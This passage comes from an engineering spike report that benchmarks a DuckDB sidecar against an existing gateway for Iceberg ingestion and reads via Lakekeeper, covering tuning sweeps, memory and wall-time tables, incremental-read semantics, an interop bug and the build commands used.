note VARCHAR, quantity BIGINT, text VARCHAR, uuid VARCHAR`), and `EXCEPT ALL` both ways against `raw.base_s_r1` is 0/0
rows for all three (`results/task4/step1/column-types.txt`): same records, same types, same values.
Error path (`results/task4/errpath/transcript.txt`): B in `tx` mode, one good page then a page with `"amount":
"not-a-number"` → `/ingest` 500 (`JSON transform error … Failed to cast value to numerical`), `/commit` HTTP 500
`statement failed, transaction rolled back`, table 0 rows / 0 snapshots. A streaming INSERT that fails (OOM, sweep below)
fails the extractor's next write (exit 20) and leaves no snapshot — but the table, created on the first chunk, stays
(empty, 0 snapshots) — an orphan the wrapper would have to drop (the gateway's behaviour on a failed run was not checked).

### Step 2 — tuning sweep (L, one run each, `results/task4/sweep/`)

Wall = component process; RSS = `time -l` max RSS, MiB; CPU = sidecar + component user+sys; snaps / files / MB from
`verify.sh`; peak local = max of the sidecar's sample of temp + shared dir and the client's sample of its page dir.
Sidecar defaults: threads 4, memory_limit 1 GiB, preserve_insertion_order true; client (C) threads 2, 512 MiB.

| Config (run) | Flags (sidecar \| client) | Wall s | Sidecar RSS | Comp. RSS | Sum RSS | CPU s | Snaps / files / MB | Peak local MiB | Load |
|---|---|---|---|---|---|---|---|---|---|
| A-stream (sw1) | `-a-mode stream` | 15.07 | 753 | 66 | 819 | 21.1 | 1 / 2 / 183.3 | 0 | 1.65 |
| A-stream-t1 (sw1) | `-threads 1` | 15.33 | 318 | 64 | 382 | 21.1 | 1 / 2 / 183.3 | 0 | 2.48 |
| A-stream-t2 (sw1) | `-threads 2` | 15.08 | 465 | 67 | 532 | 21.0 | 1 / 2 / 183.3 | 0 | 1.90 |
| A-stream-t8 (sw1) | `-threads 8` | 15.23 | 1110 | 66 | 1176 | 21.5 | 1 / 2 / 183.3 | 0 | 2.49 |
| A-stream-m256 (sw1) | `-memory-limit 256MiB` | FAIL (exit 20, OOM) | 619 | 68 | — | — | no snapshot | 206 | 2.31 |
| A-stream-npo (sw1) | `-preserve-insertion-order=false` | 15.40 | 764 | 64 | 828 | 21.6 | 1 / 2 / 183.3 | 0 | 2.16 |
| A-stream-t2-npo (sw1) | `-threads 2 -preserve-insertion-order=false` | 15.26 | 471 | 66 | 538 | 21.4 | 1 / 2 / 183.3 | 0 | 2.36 |
| A-stream-t2-m384 (sw1) | `-threads 2 -memory-limit 384MiB` | 15.19 | 485 | 66 | 551 | 21.3 | 1 / 2 / 183.3 | 0 | 2.74 |
| A-chunktx (sw1) | `-a-mode chunktx` (view per chunk) | FAIL (exit 20) | 78 | 51 | — | — | — | 0 | 2.95 |
| A-chunktx (sw2) | `-a-mode chunktx` (one segmented view) | 21.99 | 106 | 68 | 175 | 26.9 | **245 / 245** / 188.7 | 0 | 2.40 |
| A-temp (sw1) | `-a-mode temp` | 17.50 | 1383 | 66 | 1448 | 24.6 | 1 / 2 / 183.3 | **150** | 2.79 |
| B-stream (sw1) | `-b-mode stream` \| `-batch 1` | 3.67 | 938 | 13 | 951 | 4.9 | 1 / 2 / 183.4 | 19 | 2.85 |
| B-stream-t1 (sw1) | `-threads 1` | 4.67 | 314 | 14 | 328 | 4.2 | 1 / 2 / 183.3 | 19 | 2.32 |
| B-stream-t2 (sw1) | `-threads 2` | 3.77 | 548 | 15 | 563 | 4.5 | 1 / 2 / 183.4 | 19 | 2.50 |
| B-stream-m256 (sw1) | `-memory-limit 256MiB` | FAIL (exit 1, OOM) | 660 | 13 | — | — | no snapshot | 265 | 2.63 |
| B-tx-page (sw1) | `-b-mode tx` \| `-batch 1` | 5.69 | 139 | 14 | 152 | 5.9 | **40 / 40** / 184.3 | 19 | 2.27 |
| B-tx-b10 (sw1) | `-b-mode tx` \| `-batch 10` | 3.57 | 562 | 13 | 576 | 4.9 | 4 / 4 / 183.4 | 189 | 3.12 |
| B-tx-all (sw1) | `-b-mode tx` \| `-batch 0` (all pages, one INSERT) | 2.72 | 970 | 15 | 985 | 4.4 | 1 / 2 / 183.3 | **754** | 3.02 |
| C-stream (sw1) | — \| `-mode stream` | 3.78 | 951 | 156 | 1107 | 6.3 | 1 / 2 / 183.4 | 19 | 3.18 |
| C-stream-st2 (sw1) | `-threads 2` \| `-mode stream` | 3.52 | 561 | 139 | 701 | 6.0 | 1 / 2 / 183.3 | 19 | 2.17 |
| C-stream-st1 (sw1) | `-threads 1` \| `-mode stream` | 3.41 | 350 | 130 | 481 | 5.6 | 1 / 2 / 183.3 | 19 | 2.07 |
| C-stream-st2-ct1 (sw1) | `-threads 2` \| `-mode stream -threads 1` | 3.60 | 747 | 178 | 925 | 5.6 | 1 / 2 / 183.3 | 19 | 2.45 |
| C-stream-m256 (sw1) | `-memory-limit 256MiB` \| `-mode stream` | FAIL (exit 1, OOM) | 725 | 157 | — | — | no snapshot | 247 | 2.92 |
| C-page (sw1) | — \| `-mode page` (autocommit per page) | 7.27 | 438 | 395 | 833 | 9.7 | **40 / 40** / 184.3, 41 commits | 19 | 2.68 |
| C-pagetx (sw1) | — \| `-mode pagetx` | 6.44 | 490 | 490 | 980 | 9.0 | **40 / 40** / 184.3 | 19 | 2.92 |
| C-stage (sw1) | — \| `-mode stage` (client temp table) | 8.09 | 1257 | 772 | 2030 | 11.3 | 1 / 2 / 183.3 | 19 | 3.26 |
| C-urls (sw1) | — \| `-mode urls` (client read_json over the page URLs) | FAIL (client OOM 512 MiB) | 433 | 481 | — | — | — | 0 | 3.05 |
| C-urls-m1g (sw1) | — \| `-mode urls -memory-limit 1GiB` | FAIL (client OOM 1 GiB) | 1023 | 703 | — | — | — | 0 | 2.12 |

Findings:
- **Threads, not memory_limit, bound the sidecar's RSS.** The streaming INSERT holds roughly one 229 376-row row group
  per writer thread: A at 1/2/4/8 threads = 318/465/753/1110 MiB; wall is unchanged (the extractor is the bottleneck).
  `memory_limit` is not an RSS cap (256 MiB → 619-725 MiB RSS) and, set low, it does not degrade gracefully: A, B and C
  all **failed the run** with `Out of Memory Error` at 256 MiB / 4 threads (after spilling 206-265 MiB to the temp dir).
  `preserve_insertion_order=false` changed nothing measurable.
- **One INSERT per run is the only design that yields one snapshot**: per-chunk INSERTs in one transaction (A-chunktx)
  = 245 snapshots + 245 files of ~0.8 MB in one commit and +43 % wall; per-page (B-tx-page, C-page, C-pagetx) = 40.
  A-chunktx first failed with `TransactionContext Error: Attempting to write to database "lk" in a transaction that has
  already modified database "memory"` — registering an Arrow view inside the transaction is a write to the temp catalog;
  it works with one view registered before BEGIN and re-scanned per chunk (`arrowchan.EndSegment`).
- **Local staging costs memory or disk** (R6): A-temp 1.38 GiB RSS + 150 MiB spilled; B-tx-all 754 MiB of page files on
  disk (the whole dataset); C-stage 772 MiB client RSS. The streaming designs keep at most one page file (≈19 MiB) on disk.
- C-urls (the client DuckDB fetching all 40 page URLs itself with httpfs) runs out of memory at 512 MiB and at 1 GiB.
- Picked per candidate (rule: fastest wall, then lowest summed RSS among configs within 5 % of the fastest wall):
  **A = stream, threads 1** (15.33 s vs 15.07-15.40 for all stream configs; 382 MiB vs 532 at 2 threads);
  **B = stream, threads 2** (3.77 s vs 3.67 at 4 threads, 563 vs 951 MiB; 1 thread is 27 % slower);
  **C = stream, sidecar threads 1, client threads 2** (3.41 s, fastest and lowest, 481 MiB).

### Step 3 — measurement (interleaved, R4)

`cand/interleave.sh <S|L> 3`: per round `baseline → A → B → C`, round `w0` discarded, rounds `r1-r3` measured, 10 s
settle before every run (as the baseline). The baseline is the unmodified Task 2 driver (`TASK=task4/baseline
TABLE_SUFFIX=_t4i baseline/run.sh one <ds> <run>`, fresh tables `raw.base_<ds>_<run>_t4i`). Wall = component process wall
with the sidecar already up (sidecar boot recorded separately: baseline 0.23-0.35 s, A/B/C 0.18-0.34 s). Every measured
run verified (`*.verify.jsonl`): rows = expected, 1 `append` snapshot, ZSTD, files as listed. Median / min / max; MiB.

**S (200 000 rows)**

| | Wall s | Sidecar RSS | Component RSS | **Summed RSS** | Sidecar CPU s | Comp. CPU s | Total CPU s | Files / bytes / snaps | Peak local MiB | Load 1 m |
|---|---|---|---|---|---|---|---|---|---|---|
| Baseline | 2.05 / 2.02 / 2.06 | 425.7 / 425.0 / 460.7 | 62.2 / 62.2 / 63.3 | 488.3 / 487.9 / 522.9 | 0.56 | 1.74 | 2.30 / 2.27 / 2.31 | 1 / 20 504 167 / 1 | 0 | 2.22 (1.92-2.51) |
| A | 1.86 / 1.78 / 1.89 | 265.0 / 263.4 / 266.3 | 61.8 / 60.8 / 62.2 | 326.8 / 324.2 / 328.4 | 0.78 | 1.76 | 2.54 / 2.47 / 2.55 | 1 / 18 361 315 / 1 | 0 | 2.22 (2.05-2.69) |
| B | 0.69 / 0.65 / 0.69 | 256.9 / 256.8 / 257.4 | 11.5 / 11.5 / 11.7 | 268.4 / 268.3 / 269.1 | 0.83 | 0.04 | 0.86 / 0.86 / 0.87 | 1 / 18.37 MB / 1 | 18.7 | 2.03 (1.89-2.43) |
| C | 1.01 / 1.00 / 1.03 | 284.3 / 283.0 / 285.8 | 126.9 / 123.7 / 129.6 | 412.6 / 408.0 / 412.7 | 0.99 | 0.76 | 1.75 / 1.74 / 2.05 | 1 / 18 361 316 / 1 | 18.8 (client) | 1.99 (1.98-2.18) |

**L (2 000 000 rows)**

| | Wall s | Sidecar RSS | Component RSS | **Summed RSS** | Sidecar CPU s | Comp. CPU s | Total CPU s | Files / bytes / snaps (row groups) | Peak local MiB | Load 1 m |
|---|---|---|---|---|---|---|---|---|---|---|
| Baseline | **18.59** / 18.55 / 18.67 | 580.1 / 542.6 / 594.2 | 64.8 / 63.3 / 65.1 | **645.2** / 607.4 / 657.5 | 4.32 | 17.69 | 22.01 / 21.93 / 22.03 | 2 / 202 771 348 / 1 (9 × 229 376) | 0 | 4.34 (2.95-8.08) |
| A | **15.36** / 15.32 / 15.41 | 314.1 / 292.9 / 314.2 | 65.5 / 65.3 / 66.7 | **379.4** / 358.3 / 380.9 | 3.33 | 17.80 | 21.16 / 21.11 / 21.26 | 2 / 183 269 058 / 1 (9 × 229 376) | 0 | 3.54 (2.60-5.89) |
| B | **3.97** / 3.62 / 4.04 | 517.2 / 509.2 / 533.4 | 13.5 / 13.1 / 13.7 | **530.9** / 522.7 / 546.4 | 4.27 | 0.39 | 4.65 / 4.42 / 4.75 | 2 / 183.35-183.39 MB / 1 (9 × 230 720) | 18.9 | 3.31 (3.05-6.19) |
| C | **3.65** / 3.59 / 3.68 | 362.3 / 359.6 / 366.9 | 135.1 / 134.6 / 137.1 | **499.4** / 494.2 / 502.0 | 3.03 | 3.00 | 6.03 / 5.81 / 6.13 | 2 / 183 310 490 / 1 (9 × 230 720) | 18.9 (client) | 5.03 (3.63-9.72) |

**XL (10 000 000 rows, 1 run each, interleaved baseline → A → B → C)**

| | Wall s | Sidecar RSS | Component RSS | Summed RSS | XL / own L summed RSS | Total CPU s | Files / bytes / snaps | Load |
|---|---|---|---|---|---|---|---|---|
| Baseline | 91.69 | 618.3 | 66.2 | 684.5 | 1.06 | 108.9 | 7 / 1 011 942 225 / 1 | 2.92 |
| A | 75.43 | 319.3 | 66.2 | 385.5 | **1.02** | 104.0 | 7 / 916 200 493 / 1 | 2.36 |
| B | 16.81 | 520.8 | 15.6 | 536.4 | **1.01** | 20.4 | 7 / 916 636 818 / 1 | 2.66 |
| C | 15.38 | 376.2 | 132.9 | 509.2 | **1.02** | 25.1 | 7 / 916 313 546 / 1 | 2.30 |

Peak local disk (R6): A 0; B one page file (18.7-18.9 MiB on S, L and XL alike: the client writes page N, the sidecar
reads and deletes it before page N+1); C one page file on the client side. Lakekeeper audit: every candidate table 2
`commit` events (create + data, see Step 1), every baseline table 1 `commit` + 1 `create_table`.

**Q4 pass line** (bars from the interleaved baseline medians: wall ≤ 1.10 × 18.59 = **20.45 s**, summed RSS ≤ 1.25 ×
645.2 = **806.5 MiB**; the Task 2 bars 21.0 s / 814 MiB give the same verdicts):

| Candidate | L wall (× baseline) | L summed RSS (× baseline) | XL RSS / own L | Q4 |
|---|---|---|---|---|
| A (contract unchanged) | 15.36 s (0.83) ✓ | 379.4 MiB (0.59) ✓ | 1.02 ✓ | **PASS** |
| B (shared-dir files) | 3.97 s (0.21) ✓ | 530.9 MiB (0.82) ✓ | 1.01 ✓ | **PASS** |
| C (Quack) | 3.65 s (0.20) ✓ | 499.4 MiB (0.77) ✓ | 1.02 ✓ | **PASS** |

**Q4: Yes.** The best candidate on wall is C (5.1× faster than the baseline on L); the like-for-like candidate A also
passes every bar, with the unmodified extractor. What the numbers do and do not say:
- **A's 17 % wall gain is not DuckDB encoding faster.** The extractor burns the same CPU in both (17.7 vs 17.8 s);
  A's HTTP handler answers once the batch is queued, so the extractor waits less per POST than with the gateway
  (inferred from equal component CPU and lower wall; not instrumented). A's sidecar uses less CPU than the gateway
  (3.3 vs 4.3 s on L) and 54 % of its RSS.
- **A passes the RSS bar only with capped threads.** With 4 threads it is 819 MiB summed and with 8 (DuckDB's default here,
  = cores) 1176 MiB — both over 806.5 MiB. A production sidecar must pin `threads` (and so its write parallelism).
- **B's and C's 5× comes from the component, not the sidecar**: DuckDB's multi-threaded `read_json` replaces the
  extractor's single Go JSON decode (component CPU 0.4 s for B vs 17.7 s). Getting it means rewriting components to the
  file or SQL/Quack contract (Q8), and C needs `TABLE_RESOLUTION 'eager'` (whole-warehouse load at ATTACH).
- Files: same count, row groups and 1 snapshot as the baseline; DuckDB's ZSTD files are 9.6 % smaller (183.3 vs
  202.8 MB on L), as Task 3 found; A's row groups are exactly 229 376 rows (8 192-row batches), B/C's 230 720.
- Not covered: several writers/tables in one run, run-token validation, cancel, FULL_LOAD, GCS, a Linux image (all
  numbers are darwin/arm64 host processes), and the host was not idle (load 1.9-9.7, interleaving spreads it).

### Step 4 — VARIANT (B qualitative)

`results/task4/variant/`: one 50 000-row page landed by the templated B statement shape with the record kept as raw JSON:
`CREATE TABLE lk.t4v.<t> (id BIGINT, category VARCHAR, amount DOUBLE, doc VARIANT) WITH ('format-version'='3',
'write.parquet.compression-codec'='zstd'); INSERT INTO … SELECT (json->>'id')::BIGINT, json->>'category',
(json->>'amount')::DOUBLE, json::VARIANT FROM read_json_objects('<page>', format='array')` (DuckDB CLI 2.0.0, `measure/duck.sh`).
**Lakekeeper accepts it**: table metadata `format-version 3`, field `doc` type `variant`, 1 `append` snapshot, ZSTD; DuckDB
adds `write.parquet.shred-variants=true` (`lk-metadata.txt`, `verify.json`). **The DuckDB CLI reads it back** in a fresh
process: `DESCRIBE` shows `doc VARIANT`, 50 000 rows, `count(DISTINCT doc.category::VARCHAR)` = 20, path access
(`doc.quantity::BIGINT`, `doc.note::VARCHAR`) works, and `doc.text` / `doc.amount` equal the baseline's typed `text` /
`amount` for all 50 000 ids (`readback.out`). Not checked: a non-DuckDB reader (Spark, pyiceberg) of the variant column.

### Footprint (Q5, Ruling R2)

`bin/sidecar` 96 315 938 B (darwin/arm64, cgo, libduckdb linked in) + extensions iceberg 43 836 366 + avro 22 607 966 +
httpfs 19 679 534 = **182.4 MB** (+ quack 46 438 430 = 228.9 MB for C), vs the gateway's `bin/datuplet` 111 197 634 B
(whole CLI). Components: `bin/http-json-extractor` 24.1 MB, `bin/ndjson-client` 8.2 MB, `bin/quack-client` 83.2 MB
(+ the 46.4 MB quack extension). Sidecar ready (start → `/health`, incl. engine open 0.09-0.22 s): 0.18-0.34 s.

**Commands** (from `spikes/duckdb-sidecar/`):
```
CGO_ENABLED=1 go build -tags duckdb_arrow -o bin/sidecar ./cmd/sidecar
CGO_ENABLED=1 go build -tags duckdb_arrow -o bin/quack-client ./cmd/quack-client
go build -o bin/ndjson-client ./cmd/ndjson-client
bin/lkproxy -listen 127.0.0.1:58182 -upstream http://127.0.0.1:58181 -out results/task4/step1/lk-requests.jsonl &
TASK=task4/step1 SETTLE_S=2 SC_FLAGS="-catalog-uri http://127.0.0.1:58182/catalog" cand/run.sh one A A-stream S c1  # B, C alike
cand/sweep.sh                                  # Step 2 (A-chunktx sw2 / C-urls-m1g: cand/run.sh one … directly)
cand/interleave.sh S 3; cand/interleave.sh L 3 # Step 3
TASK=task4/baseline TABLE_SUFFIX=_t4i baseline/run.sh one XL r1
TASK=task4/final SC_FLAGS="-a-mode stream -threads 1" cand/run.sh one A A-best XL r1   # B/C: see cand/interleave.sh flags
cand/summarize.py task4/baseline --runs r; cand/summarize.py task4/final --runs r; cand/summarize.py task4/sweep
```
**Raw files** (`results/task4/`): `final/<A|B|C>-best.<S|L|XL>.jsonl` (labels `sidecar`, `component`) + `.verify.jsonl`
(verify.sh, Lakekeeper events, load average, sidecar stats incl. peak local bytes and per-table commit result, client
stats); `baseline/<S|L|XL>.jsonl` + `.verify.jsonl` (interleaved baseline, labels `gateway`, `extractor`);
`sweep/<cfg>.L.jsonl` + `.verify.jsonl`; logs in `<dir>/logs/`; `final-summary.txt`, `sweep-summary.txt`;
`step1/` (lkproxy log + tallies, column types), `errpath/`, `probe/` (Quack), `variant/`; smoke runs in `smoke/`.

## Read semantics

Task 5 (Q3). Paths relative to `spikes/duckdb-sidecar/`. Raw per-run lines: `results/task5/<cfg>.jsonl` (`measure/run.sh`: wall, max RSS,
CPU per process, labels `gateway` / `client` / `engine`) and `results/task5/<cfg>.run.jsonl` (client JSON, silo byte deltas,
load average); stdout/stderr and gateway logs in `results/task5/logs/`; table in `results/task5/summary.md`
(`read/summarize.py`). Read target for every full/filtered configuration: **`raw.base_l_r1`**, the baseline gateway's L table
(2 000 000 rows, 2 files, 202 771 348 B, ZSTD, 1 snapshot), so both paths read byte-identical files. Host: Apple M3, 8 cores;
1-min load 1.9-3.6 during the runs (per run in `*.run.jsonl`; not an idle host).

| Q | Answer | One sentence | Evidence |
|---|---|---|---|
| Q3a | **Partly** | The engine scans and filters the same Iceberg files correctly with identical bytes fetched (202.8 MB) and a full-scan wall (1.40 s to Arrow, 1.24-2.33 s with IPC encoding) in the same range as the gateway's decoded Arrow IPC read (1.76 s) and slower than its raw-parquet passthrough (0.41 s, which decodes nothing), but its RSS is 1.09 GiB (vs 224 MiB gateway-Arrow, 570 MiB gateway-passthrough) because `duckdb-go` materializes the result and `memory_limit` does not cap it; a 1 % filter on random data prunes nothing (still 202.8 MB), only column projection saves bytes (33 MB), `count(*)` is metadata-only (0 data bytes, 0.28 s). | `results/task5/summary.md`, `results/task5/*.run.jsonl` |
| Q3b | **Partly** | DuckDB 2.0.0 has no incremental/changes function (`snapshot_from_id` and `AT (VERSION => ...)` are as-of time travel), but a ~130-line metadata-driven read (`iceberg_snapshots` operations for APPEND_ONLY vs REQUIRES_FULL_REFRESH, `iceberg_scan_plan(produce_sequence_number)` for the added files, a `filename IN (...)` scan) returned exactly the 150 000 added rows in 0.11-0.15 s and 13.8 MB, and flags `overwrite` / `delete` in range as REQUIRES_FULL_REFRESH, whereas the gateway's incremental read is a no-op in Lakekeeper mode (full snapshot, `DeltaInfo` always nil); but the gateway cannot read any DuckDB-written table (interop blocker below). | `results/task5/inc-*.run.jsonl`, `results/task5/logs/inc-*` |

### Full and filtered scans (L, 2 M rows; warm-up discarded, median / min / max of 3)

Wall = the client process (`readbench`), sidecar/gateway already up (engine runs include a 0.07-0.2 s `engine.Open`/ATTACH).
RSS = `time -l` max RSS per process; "Summed" = gateway + client. silo bytes = delta of silo's `minio_s3_traffic_sent_bytes`
(Prometheus counters, ~10 s cache, so sampled 12 s after the run; `measure/silo.py`); host otherwise idle for S3 traffic.
Engine settings: threads 4, memory_limit 1 GiB, writable ATTACH, vended credentials, Lakekeeper direct (no proxy).

| Config | Wall s | RSS gateway MiB | RSS client/engine MiB | Summed MiB | CPU s (all procs) | silo MB sent | silo GETs | Load 1 m |
|---|---|---|---|---|---|---|---|---|
| **gateway** parquet passthrough, discard (what sql-transform fetches, minus staging) | 0.41 / 0.36 / 0.49 | 570 | 20 | 590 | 0.42 | 202.8 | 4 | 1.93 |
| gateway parquet passthrough, staged to disk + in-process DuckDB `read_parquet` full scan (sql-transform's real path) | 1.37 / 1.37 / 1.55 (fetch 0.34 + decode 1.0) | 569 | 913 | 1481 | 2.12 | 202.8 | 4 | 1.99 |
| gateway same, client-side `WHERE` (no read-time filter exists in the gateway) | 0.93 / 0.90 / 1.13 | 569 | 332 | 902 | 1.48 | 202.8 | 4 | 2.14 |
| **gateway** Arrow IPC (gateway decodes + encodes, 590 MB on the wire), discard | 1.76 / 1.74 / 1.82 | 224 | 23 | 246 | 2.13 | 202.8 | 114 | 3.57 |
| **engine** `count(*)` | 0.28 / 0.25 / 0.28 | n/a | 64 | 64 | 0.52 | **0.0** | 1 | 3.44 |
| **engine** `SELECT *` -> Arrow batches, dropped | 1.40 / 1.34 / 1.46 | n/a | 1086 | 1086 | 2.31 | 202.8 | 108 | 3.00 |
| engine `SELECT *` -> Arrow + IPC stream encode (590 MB) | 2.14 / 1.24 / 2.33 | n/a | 1088 | 1088 | 2.34 | 202.8 | 108 | 2.48 |
| engine `SELECT *` via `database/sql` `rows.Scan` | 1.99 / 1.88 / 2.16 | n/a | 1091 | 1091 | 2.94 | 202.8 | 108 | 2.82 |
| engine ~1 % filter, `SELECT *` (20 165 rows) | 1.01 / 0.96 / 1.48 | n/a | 545 | 545 | 1.71 | 202.8 | 108 | 2.23 |
| engine ~1 % filter, `SELECT id, amount` | 0.40 / 0.39 / 0.44 | n/a | 165 | 165 | 0.76 | **33.2** | 30 | 2.04 |
| engine `SELECT *` -> Arrow, threads 1 / 2 | 1.12 / 1.28 | n/a | 972 / 1106 | 972 / 1106 | 1.40 / 1.59 | 202.8 | 108 | 2.09 / 1.97 |
| engine `SELECT *` -> Arrow, memory_limit 256 MiB / 512 MiB | 1.28 / 1.22 | n/a | 976 / 1021 | 976 / 1021 | 2.29 / 2.29 | 202.8 | 108 | 2.27 / 2.82 |

Predicate: `category = 'books' AND created_at < '2024-05-26'` = **20 165 / 2 000 000 = 1.008 %** (`category` is uniform over
20 values, `created_at` is random, so no row group can be skipped). Min/max/RSS spreads for every row are in `summary.md`.

Reading the numbers:
- **Bytes are identical wherever all columns are read.** Both paths fetch the two data files whole (202.8 MB; silo counter
  delta 202 778 307-315 B = files + ~7 KB metadata). The engine's savings come only from column projection (33.2 MB for two
  columns) and from metadata-only `count(*)`; the filter row shows no row-group pruning on unclustered data.
- **The fair comparisons are two.** (i) Raw parquet to a consumer that decodes it itself: gateway 0.41 s transport only;
  sql-transform's full path (stage + decode) 1.37 s vs engine 1.40 s Arrow. (ii) A decoded Arrow stream: gateway 1.76 s vs
  engine 1.40 s (IPC encoding added: 1.24-2.33 s, noisy under load). On wall the engine is not slower than today's read path.
- **Memory is the engine's weak point.** A read through `duckdb-go` (`Arrow.QueryContext`, `database/sql`) uses
  `PendingPrepared` + `ExecutePending`, i.e. a materialized result: RSS ~1.09 GiB for the 590 MB result regardless of
  `memory_limit` (256 MiB to 1 GiB all 950-1100 MiB) or threads (972 at 1); a 20 k-row result still costs 456-537 MiB (scan
  buffers, `probe-filter-t1/t4`). A sidecar serving the engine's reads would need to chunk its queries (per file / row range);
  the write path (candidate A) streamed because the INSERT consumed the scan inside the engine. The gateway's Arrow path is
  bounded (224 MiB), its parquet passthrough holds one whole file per chunk (570 MiB for L; ~2 files of 160 MB + buffers).
- Row counts: gateway parquet passthrough reports `X-Datuplet-Rows: 0` per chunk (2 000 000 from `total_rows_estimate` and
  from the staged-file DuckDB scan, `decode_rows`); Arrow reports 2 000 000 in headers.

### Incremental reads ("rows added after snapshot X")

Engine-written table `raw.inc_1793450601` (`results/task5/inc-ids.env`): CTAS copy of `base_l_r1` (S0, seq 1, 2 000 000 rows,
2 files) + two INSERT batches (S1: 100 000 rows, S2: 50 000 rows; ids offset so batches are identifiable). Gateway-written
table `raw.rd_gw_1793453150` (`inc-gw-ids.env`): gateway APPEND 200 000 (G1), APPEND 100 000 (G2), APPEND 50 000 (G3), then
gateway FULL_LOAD 150 000 (G4), via `read/gwwrite.sh` (unmodified gateway + extractor).

**Engine, native?** No. `duckdb_functions()` lists about two dozen distinct `iceberg_*` functions and no changes/incremental one;
`snapshot_from_id` / `snapshot_from_timestamp` (on `iceberg_scan`, `iceberg_metadata`, `iceberg_files`, `iceberg_scan_plan`) and
`AT (VERSION => id)` are as-of: counts 2 000 000 / 2 100 000 / 2 150 000 at S0 / S1 / S2, `iceberg_metadata(..., snapshot_from_id=S1)`
= 3 files, 2 100 000 rows. "Added after X" therefore needs the metadata-driven path, implemented in `cmd/readbench` (`inc`):
1. `iceberg_snapshots('lk.ns.t')` (`sequence_number, snapshot_id, parent_id, operation, summary`) -> walk the parent chain from the
   current snapshot back to X; X missing or chain broken -> REQUIRES_FULL_REFRESH; any `operation != 'append'` in the range ->
   REQUIRES_FULL_REFRESH (reason names the snapshot); else APPEND_ONLY.
2. `iceberg_scan_plan('lk.ns.t', produce_sequence_number := true)` filtered by `sequence_number > seq(X)` -> the added data files.
3. `SELECT * FROM lk.ns.t WHERE filename IN (<those files>)`: `filename` is a usable virtual column on the attached table and the
   other files are not opened (silo bytes below).

| Case | Engine (metadata-driven) | Gateway `OpenReader` + `IncrementalReadSpec` | Evidence |
|---|---|---|---|
| Engine table, from S0 (2 appends in range) | APPEND_ONLY, 2 snapshots, 2 files, **150 000 rows** read = plan count, 0.11-0.15 s (classify 0.01-0.02, plan 0.02, read 0.09-0.12), **13.79 MB** from silo, 14 GETs | **cannot read the table at all**: `manifest file's 'format-version' metadata indicates version 2, but entry from manifest list indicates version 1` | `inc-engine-from-S0.run.jsonl`, `inc-gw-since-S0-*` |
| Gateway table, from G1 (G2 appended) | APPEND_ONLY, 1 snapshot, 1 file, **100 000 rows** | request accepted, full snapshot returned: **300 000 rows**, 21.45 MB, **`DeltaInfo` nil** | `inc-eng-append-range`, `inc-gw-append-range` |
| Gateway table, FULL_LOAD in range (G1 -> G4) | **REQUIRES_FULL_REFRESH**, ops `[append, append, overwrite]` (gateway FULL_LOAD = one `overwrite` snapshot: deleted 350 000, added 150 000, 1 file) | full snapshot, 150 000 rows, `DeltaInfo` nil (no APPEND_ONLY / REQUIRES_FULL_REFRESH is ever reported) | `inc-eng-after-overwrite-*`, `inc-gw-overwrite-range` |
| From G4 (= current) | APPEND_ONLY, 0 snapshots, 0 files | full snapshot again (150 000 rows) | `inc-eng-after-overwrite-3186263931565013222`, `inc-gw-since-current` |
| Unknown / expired base id | REQUIRES_FULL_REFRESH ("base snapshot is not in the table history") | not tested (same no-op path) | `inc-eng-after-overwrite-12345` |
| Engine-style FULL_LOAD in range (Task 3: `BEGIN; DELETE; INSERT; COMMIT`) | REQUIRES_FULL_REFRESH, ops `[append, append, delete, append]` (from S0) and `[delete, append]` (from S2); the `delete` snapshot's summary total (2 150 000) is stale after a merge-on-read delete | n/a (table unreadable by the gateway) | `inc-eng-after-delete-insert-*` |

**What the gateway really does (code, `pkg/datagateway/server_v2_reading.go:41-56`):** in Lakekeeper mode (the only K8s mode)
any `IncrementalReadSpec` (request or `since_snapshot` / `sinceTimestampMs` in config) is logged as
`warning: incremental reads not yet supported in lakekeeper mode ... falling back to full snapshot` and dropped; `deltaInfo`
is declared and returned but never assigned anywhere in `pkg/datagateway`, so APPEND_ONLY / REQUIRES_FULL_REFRESH is **dead
protocol surface today**. Verified live (warning in `results/task5/logs/inc-gw-*.gateway.log`, nil `delta_info` in every
`inc-gw-*` run). So the candidate does not lose incremental parity; it would be the first working implementation.
Caveats of the metadata approach: `replace` (compaction / `iceberg_rewrite_data_files`) and `overwrite` are treated as full
refresh (conservative; a pure `replace` is logically a no-op but its rewritten files carry new sequence numbers); the
sequence-number filter assumes no merge-on-read delete files were added in an append-only range (guaranteed by the operation
check); expired base snapshots are detected only if the history was expired, not by timestamp.

### Interop finding (Q8, blocks a mixed fleet): the gateway cannot read DuckDB-written tables

> **Resolved by Task 5b (`## Iceberg interop` below):** the deviation is iceberg-go's, not DuckDB's; PyIceberg reads every DuckDB-written table and iceberg-go ≥ v0.7.0 (apache/iceberg-go#1762) fixes the check. Not a lock-in blocker.

Every table the engine wrote (the 4-snapshot table above, Task 4's single-snapshot S and L candidate tables, and fresh v2 and
v3 CTAS tables, `results/task5/logs/probe-interop-*`, `probe-gw-duckdb-written-*`) fails the gateway's `OpenReader` with
`lakekeeper: fetch manifest entries ...: manifest file's 'format-version' metadata indicates version 2 (or 3), but entry from
manifest list indicates version 1` (iceberg-go `v0.5.1-0.20260429200022-af2ddd4adf06`, `manifest.go:579`). The reverse
direction works: DuckDB reads all gateway-written tables (every read above). Root cause was not isolated (the check compares
the manifest file's `format-version` header with the version iceberg-go derives for the manifest-list entry; DuckDB's
manifest lists evidently resolve to v1 there). Consequence: any consumer still on the gateway (sql-transform via
`OpenReader`, the pipeline-api storage fallback, anything built on iceberg-go) cannot read tables that engine-sidecars wrote
until iceberg-go or DuckDB's manifest writer changes. Position-delete files (Task 3 DELETE/MERGE) would additionally reach
`LoadTableForRead`'s manifest walk, which appends every entry of every manifest to `dataFiles` without checking
`manifest_content` (code reading only; not exercised because the version error comes first).

### Not measured / limits
- silo bytes come from the Prometheus counters (cluster-wide, ~10 s cache); no per-request S3 log was available (`mc admin trace`
  not in the image). Gateway and engine byte totals agree to the byte (202 778 3xx), which cross-checks the method.
- One table size (L), one host with background load 1.9-3.6; no XL read; no GCS; token validation / OpenFGA out of scope.
- The spike module cannot import `sdk/go` (separate module); `readbench gw` issues the same two calls as the SDK / sql-transform
  (gRPC `OpenReader`, then HTTP `GET /data/read/<id>` per chunk to `X-Datuplet-Is-Last`) using the copied `internal/gwpb` stubs.

### Commands
```
cd spikes/duckdb-sidecar
CGO_ENABLED=1 go build -tags duckdb_arrow -o bin/readbench ./cmd/readbench
bin/jsonsrv -rows 2000000 &                        # only for read/gwwrite.sh
